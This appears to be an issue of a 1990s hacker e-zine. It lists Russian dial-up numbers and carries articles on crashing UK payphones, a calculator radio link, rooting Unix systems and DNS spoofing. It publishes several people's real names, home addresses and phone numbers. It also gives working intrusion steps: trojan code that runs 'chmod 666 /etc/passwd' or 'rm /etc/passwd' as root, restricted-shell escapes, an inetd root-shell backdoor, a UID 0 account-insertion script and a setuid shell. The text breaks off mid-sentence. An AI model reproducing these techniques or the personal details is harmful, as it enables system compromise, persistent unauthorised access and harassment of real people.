   ----------------------------------------------------------------

    281-0201
    975-0520
        (37)

   ----------------------------------------------------------------
                        INTEL PORT :
   ----------------------------------------------------------------

    956-4787 Main
    434-1565 Registration
    202-6934 Demo

   ----------------------------------------------------------------
         Youth Science Center Linux server  Dmitry Ablov 9540012
   ----------------------------------------------------------------

    Data lines:      Line 1:  954-0664 (14400, 24h, UUPC only)
                          2:  954-0058 (14400, 21:00 - 09:00)
                          3:  954-0914 ( 9600, 21:00 - 09:00)
                          4:  954-0147 (33600, 24h, PPP only)
                          5:  954-0144 (33600, 24h, RAS only)
                          6:  954-0445 (33600, 24h, restricted)

   ----------------------------------------------------------------
                       Comstar Dialup
   ----------------------------------------------------------------

    2324626
    2329696

   ----------------------------------------------------------------
                       www.com2com.ru
   ----------------------------------------------------------------

    234-7171  PPP check
    956-0112  PPP check

   ----------------------------------------------------------------
                       www.gamma.ru
   ----------------------------------------------------------------

    742-04-42 (6 «¨­¨© USR Courier 33600)
    232-68-06 (5 «¨­¨© USR Courier 33600)
    913-39-44 (1 «¨­¨ï USR Courier 33600)
    939-15-57 (1 «¨­¨ï USR Sportster 28800)
    939-35-26 (1 «¨­¨ï USR Sportster 28800)
    939-26-18 (Zyxel 19200)
    932-88-78 (1 «¨­¨ï GVC 2400)
    939-18-51 (1 «¨­¨ï GVC 2400)

   ----------------------------------------------------------------
                      Mr Postman sunny.aha.ru
   ----------------------------------------------------------------

    9566243  42?lines USRobotics Courier V.Everything (33600 V.34+)
    9560124  JS Comstar
    2512555  MGTS (Moscow PSTN), Miusskiy node
    2512591
    2511030

   ----------------------------------------------------------------
                         www.co.ru  Combellga
   ----------------------------------------------------------------

    9265020
    9357120   (¢á¥£® 30 ¢å®¤®¢)

   ----------------------------------------------------------------
                        www.techno.ru
   ----------------------------------------------------------------

    234-33-03 (á¥à¨ï 8 â¥«.)
    965-09-93
    965-09-01
    465-67-07
    463-25-20
    461-82-11
    965-10-19 (28 «¨­¨©)
    Online guest 234-35-99

   ----------------------------------------------------------------
                        www.redline.ru
   ----------------------------------------------------------------

    956-67-56
    928-84-29 (á¥à¨ï 17 «¨­¨©)
    200-24-71

   ----------------------------------------------------------------
                       www.netclub.ru
   ----------------------------------------------------------------

    2476205 (US Robotics 33600)
    2476204 (Zuxel)

   ----------------------------------------------------------------
                        www.space.ru
   ----------------------------------------------------------------

    913-50-20
    747-33-55 (¢á¥£® 33 «¨­¨¨)

   ----------------------------------------------------------------
                        www.relcom.ru
   ----------------------------------------------------------------

    946-99-84
    946-99-94
    926-50-18
    947-55-99
    913-57-47
    753-07-77
    742-57-27

   ----------------------------------------------------------------
                          www.sitek.ru
   ----------------------------------------------------------------

    963-31-01
    963-21-01
    963-11-01
    964-10-01 (60 «¨­¨©).

   ----------------------------------------------------------------
                        www.glasnet.ru
   ----------------------------------------------------------------

    928-44-46
    928-00-53
    262-02-09
    262-20-72
    262-02-27
    927-41-11
    975-00-54
    971-52-01  (¢á¥£® ¡®«¥¥ 170 ¬®¤¥¬­ëå ¢å®¤®¢).

   ----------------------------------------------------------------
                        www.synapse.ru
   ----------------------------------------------------------------

    201-25-87
    203-47-44(â)
    956-47-87(â)

   ----------------------------------------------------------------
                      web.rosmail.com POCHET
   ----------------------------------------------------------------

    924-85-69
    956-61-02(30 ¢å®¤®¢)

   ----------------------------------------------------------------
                       www.park.ru
   ----------------------------------------------------------------

    247-62-36
    932-91-40

   ----------------------------------------------------------------
                      www.rinet.ru
   ----------------------------------------------------------------

    9567800
    9138111 (33600)

   ----------------------------------------------------------------
                      www.compnet.ru
   ----------------------------------------------------------------

    964-31-01
    963-20-01

   ----------------------------------------------------------------
                      www.corbina.ru
   ----------------------------------------------------------------

    7559298    (USR Courier 33600)
    7851102

   ----------------------------------------------------------------
               Misc Voice/t0ne/Carrier services
   ----------------------------------------------------------------

    00wait5   STB Card processing center
    00wait9   free information service

    9629424     demo user code : 12345 FaxInfo Demo Voice Line
    9759220     Telephone Voice Bulletin Board

    7059285     leave me mail in 80718 box

    9253503     Online registration 4 email
    9253507     billing for telephone #

    2587474     Logon:
    2586435
    2586411
    2586414
      30;32
    9269199
    9500885
    9563686
    9564787     Interport Mailbox ( t0ne )
    9560050     Unknown system ( t0ne )
    9585474     PassWord:
    7473355     ASVT Dial Up Gateway 2   Users: Oleg & Alex

    9560885  "The Microsoft Network is no longer
                            providing MSN in Russia"

   ----------------------------------------------------------------
                 _always_ BUSY #s ( unpluged )
   ----------------------------------------------------------------

    111-11xx
    222-2222
    980xxxxx-999xxxxx

   ----------------------------------------------------------------
                    Gate to Iskra2 lines
   ----------------------------------------------------------------

    742xxxx  Call for 8-097-2nodes
    913xxxx  Call for 8-097-3nodes

   -=-=-=-=-=-=-=-=-=-=-= Free 800 Services  =-=-=-=-=-=-=-=-=-=-=-
                           þ Moscow #s

    7473320 Rus  MCI Operators  in California
    7473322 Eng  connect me to Customer's Service in Russian
    7473321 AT&T Operators  in New-York
    7473323
    7473324 Sprint Global, Arizona, USA
    7473325 Orua,Canada
    7473326 Otele Code ?
    7473327 National Calling Center, UK
    7473328
    7473329 Japan
    7473356 Sprint Calling Cards
    7473357
    7473359  France service
    7473360
    7473361  Italian service
    7473363  Chili ? service

                        þ National Russian #s

    8-10 800 4977211 - ( AT&T);
    8-10 800 4977222 - ( MCI);
    8-10 800 4977255 - ( Sprint) ;
    8-10 800 4977220 - (MCI àãááª®ï§ëç­ ï á«ã¦¡ );
    8-10 800 4977233 -  ­ ¤  (Teleglob);
    8-10 800 4977266 - ¥«¨ª®¡à¨â ­¨ï(BT);
    8-10 800 4977277 - ¥«¨ª®¡à¨â ­¨ï( Mercuri);
    8-10 800 4977288 - ¥­£à¨ï;
    8-10 800 4977181 - ¯®­¨ï ( KDD);
    8-10 800 4974358 - ¨­«ï­¤¨ï( Telecom Finland);
    8-10 800 4977032 - ¥«ì£¨ï (Belgacom, calling cards);
    8-10 800 4977212 - ¥«ì£¨ï ( Belgacom,operator);
    8-10 800 4977039 - â «¨ï (Iritel);
    8-10 800 4977353 - à« ­¤¨ï ( Telecom Iriland);
    8-10 800 4977156 - ¨«¨;
    8-10 800 4977165 - ¨­£ ¯ãà;
    8-10 800 4977141 - ¢¥©æ à¨ï.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. How to fuck over a UK payphone : so1o / NightRage
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

We found this out by total coincidence at the Bristol 2600 meeting...

This is a DoS (Denial of Service) attack for payphones in the UK, it uses
the national test number (175) and your local test number - at your local
excahnge, which in Bristol is 17070 (I think), so you do the following...

  1) Approach the telephone booth.
  2) Pick up the handset.
  3) Put 10p into the phone - you will get this back.
  4) Dial your local excahnge test number.
  5) Put the handset down.
  6) Pick the handset up.
  7) Dial your national exchange test number.
  8) Listen to all the noise and shit for about 10 seconds.
  9) Put the handset down.

The LCD display in the booth will now say words to the following..

  "BT Apologise, but this telephone is out of order."

About 30 seconds later, the phone will return back to normal.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Radio link for TI-85 calculators : Michael Jan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  ********************************************************************
  -- INTRO -----------------------------------------------------------
  ********************************************************************

  RT LINK (Radio transfer link) basicly functions like a regular
  TI-LINK except it is wireless! The parts for making this link will 
  cost around $15 - $20 dollars for a pair, and the frequency is adjustable.

  You may post & share this plan. But please give me credit for my 
  work (at least put my name, Michael Jan).  I TESTED this plan, they transfer
  within the range of 30 to 50 feet. (Which is more than what I expected,
  great!). The following are the parts you need, you can obtain them at R.S.
			

  ********************************************************************
  -- PARTS -----------------------------------------------------------
  ********************************************************************

  PARTS           VALUE                           QUANTITY
  --------------------------------------------------------------------

  TI LINK         [TI BLACK LINK]                 1
  (Cut Into 2)

  Capacitors      [470 pF]                        2
                  [100 pF]                        2
                  [10  pF]                        2
                  [4   pF]                        4
                  [.01 uF]                        2
                  [10  uF]                        4

  Resistors       [10K Ohm]                       2
                  [1.2K Ohm]                      2
                  [33K Ohm]                       4
                  [100 Ohm]                       2
                  [180 Ohm]                       2

  Transistors     [2SC1923]                       4

  Coil(L)         [.27-.3]                        4

  Battery Holder  [Holds 2 AA or 2 AAA]           2

  Batteries       [AA or AAA]                     4

  Diode           [Germanium]                     2

  Copper Wire     [2 Feet]                        2
  (Ant.)

 *****************************************************************************
 *** NOTE The Parts Are For TWO RT LINKs, Because They ONLY WORK In PAIRS! ***
 *****************************************************************************

  *******************************************************************
  -- DIRECTIONS -----------------------------------------------------
  *******************************************************************

  1. Print Out The Schematic Diagram (The Included GIF File), It is
     Easier To Put Parts Together.

  2. Put The Parts Together By Following The Diagram (VERY IMPORTANT).
       *** NOTE For Schematic Diagram --

          Red Wire   = From TI Link
          White Wire = From TI Link
          (Copper Wire From TI Link Will Not Be Use)

                  R  = Resistors
                  C  = Capacitors
                  T  = Transistors

          Connect +, - To Battery Holder

  3. Adjust The 4 Coil(L)s Clockwise To MAX On Both RT Links.
     This Will Adjust The Frequences On Both LINKs To Be The Same.
     (You Can Adjust To Any Frequence You Like Between 90MHz-100MHz)

  4. Put 2 Batteries Into Both Holders

  5. THAT'S IT!!!, ENJOY YOUR RT-LINK !!!!  =)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. More sIn inf0z : The CodeZero + Friends
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                sIn are 0fficially property of the CodeZero.

-------------------------------------------------------------------------------

 Alias      :  Evil Chick
 Real Name  :  Suzette Kimminau
 Address    :  130 105th Ave. S.E. Apt. 218
               Bellevue, Wa 98004
               USA

 Telephone  :  (206)454-7176
 Email      :  evilchic@NWLINK.COM

-------------------------------------------------------------------------------

 Alias      :  \\StOrM\\
 Real Name  :  Jason Sloderbeck
 Address    :  5739 N Norton,
               Kansas City, MO 64119
               USA

 Telephone  :  (816)453-8722
 Email      :  storm@SINNERZ.COM

-------------------------------------------------------------------------------

 Alias      :  JDKane
 Real Name  :  Kim
 Address    :  327 E Park Road,
               Round Lake, IL 60073
               USA

 Telephone  :  (847)546-9154
 Email      :  

-------------------------------------------------------------------------------

 Alias      :  JeNnYGrRl
 Real Name  :  Jennifer Chambers
 Address    :  
               Kansas City, MO 61421
               USA

 Telephone  :  
 Email      :  

-------------------------------------------------------------------------------

                         We got more, but not complete,

                      They can run, but they can never hide,
    
                         http://www.codez.com/inf0z.html

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Rooting From Bin : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This is something I was thinking alot about the other day, I was on a System V
Release 4, I had just performed the chkperm exploit, which only gives
bin access (uid=1 and gid=1) to the system, so even though I own all the
files in the /bin/ directory, I am still not root. Here is a very very simple
technique I developed for such occasions, this may come in useful one day for
someone, somewhere...

Write a program that you can get people to run, you could get hold of the
source for a common program, such as su or who or mount. Put this line in
it somewhere:

if ( !strcmp(getlogin(),"root") ) system("whatever you want");

This checks to see if the root login is running your program.  If he is, you
can have him execute any shell command you'd like.  Here are some suggestions:

"chmod 666 /etc/passwd"

/etc/passwd is the system's password file.  The root owns this file.
Normally, everyone can read it (the passwords are encrypted) but only the root
can write to it.  Take a look at it and see how it's formatted if you don't
know already.  This command makes it possible for you to now write to the file

- i.e. create unlimited accounts for yourself and your friends.

"chmod 666 /etc/group"

By adding yourelf to some high-access groups, you can open many doors.

"chmod 666 /usr/lib/uucp/L.sys"

Look for this file on your system if it is on the uucp net.  It contains
dialups and passwords to other systems on the net, and normally only the uucp
administrator can read it.  Find out who owns this file and get him to
unknowingly execute a program to unlock it for you.

"rm /etc/passwd"

If you can get the root to execute this command, the system's passwd file
will be removed and the system will go down and will not come up for some time
to come.  This is very destructive and evil, but pointless, if you do want to
damage a system, at least use your imagination.

If you are going to go about adding a trojan horse program to the system,
there are some rules you should follow.  If the hidden purpose is something
major (such as unlocking the user's mbox or deleting all of his files or
something) this program shouldn't be a program that people will be running a
lot (such as a popular computer game) - once people discover that their files
are public access the source of the problem will be discovered quite easily.
Save this purpose for a 'test' program (such as a game you're in the process
of writing) that you ask individual people to run via mail or 'chatting' with
them.  As I said, this 'test' program can bomb or print a phony error message
after completing its task, and you will just tell the person "well, I guess
it needs more work", wait until they log off, and then read whatever file of
theirs that you've unlocked.  If your trojan horse program's sole purpose is
to catch a specific user running it - such as the root or other high-powered
user - you can put the code to do so in a program that will be run a lot by
various users of the system.  Your modification will remain dormant until he
runs it.  If you cant find the source to 'star trek' or whatever in C, just
learn C and convert something from pascal.  It can't hurt to learn C as it's a
great language.  We've just seen what it can do on a UNIX system.  Once you've
caught the root (i.e. you can now modify the /etc/passwd file) remove the
spurious code from your trojan horse program and you'll never be caught.

so1o.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. DNS Spoofing : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

You can now use a new DNS spoofing technique originally developed by johan,
I have seen this technique often applied to IRC, and prym was one of the first
to use the technique for that purpose.

Here is a basic introduction into the DNS concept.
--------------------------------------------------

DNS stands for Domain Name Server although you may hear it refered to as
Dynamic Name Server. DNS servers are used so that instead of everyone having
numeric IP's for their websites and shit, they can use a DNS so that a client
can 'lookup' the name (eatme.com for example) to the numeric IP.

Basically, a DNS server is a computer which is running a nameserver daemon
typically listening on UDP port 53. When a new domain is setup the domain is
registered with Internic. Internic then tells its clients who has authority
over the domains registered with it.

For example say 1.2.3.4 wanted to resolve the address for peachie.com and
1.2.3.4's nameserver was 1.3.3.7. 1.2.3.4 would ask 1.3.3.7 what the numeric
IP for peachie.com was, so 1.3.3.7 would ask internic who had authority over
peachie.com and internic might reply with ns.peachie.com. So then 1.3.3.7
would ask ns.peachie.com what the numeric IP for peachie.com was.
Then ns.peachie.com would tell 1.3.3.7 that the numeric IP for peachie.com
was 4.3.2.1 and then 1.3.3.7 would then tell 1.2.3.4 the numeric IP and the
name would be resolved.

DNS servers generally cache addresses that are looked up by its clients.
So if 1.2.3.4 were to ask 1.3.3.7 what the address for taco.com was again,
1.3.3.7 would not ask Internic etc. instead it would take the IP that it had
previously resolved earlier and say that the numeric IP for peachie.com is
4.3.2.1. the funny part is that the DNS server doesn't do alot of checking
when another nameserver replies to its query. It basically just tells the
client what is was told at an earlier point and caches it in the same way.
This is why we can spoof using such a technique, but we would need root
access to a nameserver first, this is one of the biggest setbacks...

How to spoof your DNS.
----------------------

Lets say were sitting on ns.peachie.com with root, and we have authority
for all of peachie.com. we want to cache our boxs address 2.2.2.2 on the
remote nameserver ns.eatme.org so that we can connect to eatme.org with the
address of trusted.eatme.org. We could write a program that listens for DNS
queries and replies with false information. sitting on ns.peachie.com we
could lookup peachie.com on the nameserver ns.eatme.org. ns.eatme.org would
ask Internic who had authority for peachie.com and it would reply to
ns.eatme.org that ns.peachie.com had authority over peachie.com. Then
ns.eatme.org would ask ns.peachie.com what the address for peachie.com was.

If we were running a normal DNS then it would tell ns.eatme.org that the
address for peachie.com was 4.3.2.1. but we aren't. We'll say that
ns.peachie.com tells ns.eatme.org that the reverse of 2.2.2.2 is
trusted.peachie.com and the address for trusted.peachie.com is 2.2.2.2.
This exploits the failure to check a few things on the DNS.

Basically ns.eatme.org asked what the numeric IP for peachie.com was and we
told it that the reverse of 2.2.2.2 is trusted.eatme.org and that the IP
of trusted.eatme.org is 2.2.2.2. They asked a question to which we responded
with two awnsers to different question entirely. Now we would simply connect
to eatme.org from 2.2.2.2 and eatme.org would ask ns.eatme.org for the reverse
of 2.2.2.2 and in its cache it would find trusted.eatme.org and it would reply
with that answer. Then it would ask for the address of trusted.eatme.org and
it would reply with 2.2.2.2. you would then be connected to eatme.org
from trusted.eatme.org and in effect DNS spoofing.

That's all there is to it, it may be a bit heavy for some people.

so1o.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. FreeNet : TrN
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Breaking security on restricted shells and freenets.

What many system administrators fail to realize is that by setting up shells
and security on their applications and systems, and generally trying to lock
users in a freenet menu environment, it is almost impossible to fully examine
every program. Many programs allow you to escape to shells, even in secure mode,
especially the older ones. There is a longstanding bug in the gohper
application, used by many freenets, that allows you to start up a gopher server,
where an entry is created such as ";sh". Following this entry provides a shell.
This is the main reason why the original gopher client is no longer in use.
A "l;rm -rf *" was just as easy.

In todays world, the biggest problem is that freenets usually allow you to edit
files. If this is the case, you almost have a 100% chance of you getting into
a real shell. What you first have to do is see if you can go through the menu
system to edit a file. If you can't that is cool too.  We are going to show you
how to get a shell out of PINE. It doesn't matter which version, this works all
the way up to 3.96. Anyway, like I was saying, you should see if you can either
a) edit a file, or b) upload a file. I'm almost sure you can do either.
So, lets start a little session here. First, you have to edit your .pinerc.
If you can't, download it (or get it from the PINE  package), make the changes,
and reupload it. What is important is that you edit the feature-list=commands,
and have it read something similar to this:

feature-list=enable-alternate-editor-cmd,
             enable-unix-pipe-cmd

After setting this correctly, go further in the file, and until you find the
editor= command. It is stated that the editor is normally set to sh, and
invoked via _^ [Control-Shift-Dash]. Do you get the idea yet?
Set the line to read editor=sh and then save the file. Now for the fun part.
Start up pine, and chose Compose Message. Erase all the To/Cc/Att/Sub headers,
and make the message text blank, except for the work "sh" (without the quotes)
on a single line. After this is done, press the alternate editor hotkey (^_).
Here is what happens:

To      :
Cc      :
Attchmnt:
Subject :
----- Message Text -----
sh
$                

Kinda neat. That little $ is the sign that it all worked. What you probably
want to do is execute some of the standard commands that tell you a little
about where you are:

$ uname -a ; uptime ; /sbin/ifconfig -a
SunOS pb 4.1.3_U1 1 sun4m
12:14am up 47 days, 12:18, 24 users, load average: 2.71
le0: flags=63<UP,BROADCAST,NOTRAILERS,RUNNING> 
     inet 199.227.192.35 ffffff00 199.227.192.0
lo0: flags=49<UP,LOOPBACK,RUNNING> 
     inet 127.0.0.1 ff000000

Then a w ; ps -aux would be nice. It can tell you a little about what is going
on, and what is safe to do the things you want. You should probably log on
late at night, compile slirp if it is only a shell/vt dialin, and then check
the system for vunerabilities, unshadowed passwords, etc. I've notified my
freenet of their problems, but they don't seem to care. Maybe now they will.
Ok  sysadmins,  fix  up  your freenets, and hackers... Hack the planet. :-)

This  article  by  TrN  of The CodeZero. I'll have more interesting information
on the way. You can get ahold of me at http://bluebox.dyn.ml.org:8000, or by
e-mail at p033644b@pbfreenet.seflin.lib.fl.us. You should check out the web
page, as it has other security related information. LaterZ.

  One other thing to consider, if ports 514 / 512 are open, then you can try
  creating an .rhosts file in your home directory containing "+ +", then use..

  rsh -l loginhere systemhere.com csh -i

  ...and you will get a shell -- so1o.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Backdoors Revised : Blk-Majik
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Disclamer:

If you do anything mentioned in this article, it is your own fault and any
trouble you manage to get into is your own responsibility, not mine.
But what am I thinking...like any of you lamers can root a shell :).

gr33tz:

A big wuzzup to cf, oK, oa, and gZ!  Keep it kewl, madmax, imunknown, pack,
plum, mogle, crytpo`, so1o, c0d, and da rest of muh boys! Thanx to mcooly for
making this document possible and helping me out!

=============================================================================
  section 1:
=============================================================================

What is a back door? :

Well, kiddies, a backdoor is just a way to remotely get into a shell without
being noticed or sometimes logged. This can be done by adding a extra telnet
port to the server I will show you a few ways to set up the port, and also
how to keep it up even after the admin find it.
so1o had a section in a back issue with a back door using the inetd.conf
file where you had to end all commands with a ";".  Well that annoyed the
hell out of me so I have modified his technique.

=============================================================================
  section 2:
=============================================================================

What you need :

Basically, you need root on a shell to start (and a Unix based OS).
After that, you will need a good editor....say pico or vi. Most of you
#shells wh0res need, but lack this important ingredient....a fucking brain.

=============================================================================
  section 3:
=============================================================================

Understanding the technique :

After you checked your head, editor, whoami, etc, you are all set. Ok, this
is what you look for:

/etc/services      This file lets you find a port
/ect/inetd.conf    This is where the backdoor will be

ok, in the /etc/services file, you will see something like this:

tcpmux            1/tcp    #TCP Port Service Multiplexer
tcpmux            1/udp    #TCP Port Service Multiplexer
compressnet       2/tcp    #Management Utility
compressnet       2/udp    #Management Utility
compressnet       3/tcp    #Compression Process
compressnet       3/udp    #Compression Process

ok, what the fuck is that? ill explain it with this example:

ftp              21/tcp    #File Transfer [Control]
ftp              21/udp    #File Transfer [Control]

[1]             [2]/[3]    #[         4           ]

  1: The name of the service of the system.
  2: The port that the system uses for the service.
  3: The protocol (going to be tcp. You can chose either tcp or udp.)
  4: A description of what the service is used for.

Aight, thats the service file...you will need this later.

now look at the /etc/inetd.conf file. the inetd is a Internet daemon that
will listen for tcp requests and UDP prots and then spaws the program when a
connection request is made.

It will look like this:

ftp     stream  tcp     nowait  root    /usr/libexec/tcpd       ftpd -l -A
telnet  stream  tcp     nowait  root    /usr/libexec/tcpd       telnetd
shell   stream  tcp     nowait  root    /usr/libexec/tcpd       rshd
login   stream  tcp     nowait  root    /usr/libexec/tcpd       rlogind -a
exec    stream  tcp     nowait  root    /usr/libexec/tcpd       rexecd

let me explain it:
 
ftp     stream  tcp     nowait  root    /usr/libexec/tcpd       ftpd -l -A
[1]     [  2  ] [3]     [  4 ]  [ 5 ]   [      6         ]      [    7    ]

  1: Name of deamon in the services file. It tells inetd what to look for in
     /etc/services to see what port to use when connecting.
  2: Type of of socket connection that the deamon will accept.
  3: Protocol field which is always TCP or UDP.
  4: How long to delay connection.
  5: User to run on the deamon as (used with uid/gid permissions etc.)
  6: What program will keep the connection.
  7: The actual command or daemon.

Ok, so what that dose it makes a port for telnet (port 21, as defined in the
services file). It has a stream/tcp connection and dosn't wait for a prompt.
The user is of root access and uses /ur/libexec/tcpd (but limited commands)
                                                  
Ok, now u know what the shit is for, next step...

=============================================================================
  section 4:
=============================================================================

Installing the backdoor :

Backdoor I : Using /etc/inetd.conf and /etc/services
----------------------------------------------------

method 1 :
----------

ok, now go back to the /etc/services file. Look at it and find a service you
think the admin will not notice, and that is not in use. remember the name
of the service.  Now, go to the inetd.conf file. Go to a place with all the
services name where the 1 is in the above example. Add you service somewhere
so it is hidden within others. For 2, put the port of the service. 3 is tcp,
duh. 4 is nowait. 5 will be root, so u get root access. 6 is going to be
/bin/sh or what ever you like. 7 has to be 6 -i..ex: if 7 is /bin/sh,
7 is /bin/sh -i

here is an example:

ftp     stream  tcp     nowait  root  /bin/sh     sh -i

Ok, now you have to restart the inetd. do this by typing (as root) :

killall -HUP inetd

Ok, now lets test it. From a different system...

telnet victum.server.com 21
Trying 123.456.78.9...
Connected to comp.com
Escape character is '^]'.
bash#
bash# whoami
root
bash#

tip:

do NOT use the ftp port...it is just used to often. Pick a service that is
not use alot.  It will help you keep the backdoor running.

method 2:
---------

If you are willing, you can add your own service to the service file.
This is easy..say you service file is like this:

netbios-ssn     139/tcp         nbssn
imap            143/tcp                         # imap network mail protocol
NeWS            144/tcp         news            # Window System
snmp            161/udp

ok, look at the ports.....see how they skip a few?  well lets fill 1 of them
up...

netbios-ssn     139/tcp         nbssn
suled           142/tcp         suled     
imap            143/tcp                         # imap network mail protocol
NeWS            144/tcp         news            # Window System
snmp            161/udp

Notice the suled service...that I added that to the /etc/services.

Ok, now to the /etc/inetd.conf file:

ftp     stream  tcp     nowait  root    /usr/sbin/tcpd  in.ftpd -l -a
telnet  stream  tcp     nowait  root    /usr/sbin/tcpd  in.telnetd
gopher  stream  tcp     nowait  root    /usr/sbin/tcpd  gn

...Here we go!!

ftp     stream  tcp     nowait  root    /usr/sbin/tcpd  in.ftpd -l -a
telnet  stream  tcp     nowait  root    /usr/sbin/tcpd  in.telnetd
gopher  stream  tcp     nowait  root    /usr/sbin/tcpd  gn
suled   stream  tcp     nowait  root    /bin/sh         sh -i

Ok, now restart inetd like i said how to before...

You're all set, telnet localhost <port u set> and test it!@~#

Backdoor II: Da beauty of CRON
-------------------------------

Ok, cron trojans are good for keeping root if the admin kills the backdoor.
A Cron is a timed daemon. It consits of hours, minutes, etc. It will make the
system automatically issue a command on the shell at a given time of your
choice...  Type crontab in the shell. It will tell you how to list, run and
remove crons. You will like to look at the /var/spool/cron/crontabs/root.
This is what the crons will look like:

 0       0       *       *       1       /usr/bin/updatedb
[1]     [2]     [3]     [4]     [5]     [       6         ]

  1: munute, 0-59
  2: hour, 0-23
  3: day of month, 1-31
  4: month of yeat, 1-12
  5: day of week, 0-6
  6: command to execute

The example above is issued on monday's. If you want to exploit the cron,
simply add an cron line to the /var/spool/crontab/root.

ie: If you use the UID 0 account (as seen later), you can make a cron to
    see if the UID 0 account is still alive. If root killed it, the cron can
    re-add it!

...This will make the UID 0 account, just for back-up:

Cron #1
-------

newuser.sh
----------

#!/bin/sh
# Inserts a UID 0 account into the middle of the passwd file.
# There is likely a way to do this in 1/2 a line of AWK or SED.  Oh well.
# daemon9@netcom.com

set linecount = `wc -l /etc/passwd`
cd                                              # Do this at home.
cp /etc/passwd ./temppass                       # Safety first.
echo passwd file has $linecount[1] lines.
@ linecount[1] /= 2
@ linecount[1] += 1                             # we only want 2 temp files
echo Creating two files, $linecount[1] lines each \(or approximately that\).
split -$linecount[1] ./temppass                 # passwd string optional
echo "YourUser::0:0:Mr. Hacker:/home/hacker:/bin/csh" >> ./xaa
cat ./xab >> ./xaa
mv ./xaa /etc/passwd
chmod 644 /etc/passwd                           # or whatever it was beforehand
rm ./xa* ./temppass
echo Done...


*** NOTE : MODIFY THE ECHO "YOURUSER..." PART!!

Here is a script that kinda does the same thing, but instead of making a new
account, it will look for an old, disabled account and enable it just for you :


dead.sh
-------

#!/bin/sh
# Everyone's favorite...

cp /bin/csh /tmp/.yourlittleshell      # Don't name it that...
chmod 4755 /tmp/.yourlittleshell

Ok, here is where the cron comes in. It will look in the passwd files to
